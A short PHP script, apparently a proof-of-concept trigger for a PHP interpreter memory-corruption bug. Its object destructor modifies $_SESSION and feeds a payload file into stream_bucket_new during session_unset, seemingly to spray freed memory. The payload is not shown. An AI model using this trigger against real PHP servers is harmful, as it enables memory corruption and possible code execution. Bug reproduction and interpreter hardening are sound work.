<?php
$payload = file_get_contents("/tmp/payload.bin");
$fp = fopen("php://memory", "w");
class X {
    public $fp, $payload, $keep = [];
    function __construct($fp, $payload) { $this->fp = $fp; $this->payload = $payload; }
    function __destruct() {
        $_SESSION["pwn"] = "x";
        $this->keep[] = stream_bucket_new($this->fp, $this->payload);
        file_put_contents("/tmp/destruct_done", "1");
    }
}
session_start();
$_SESSION["x"] = new X($fp, $payload);
for ($i = 0; $i < 7; $i++) { $_SESSION["k".$i] = "v"; }
session_unset();
echo "AFTER\n";
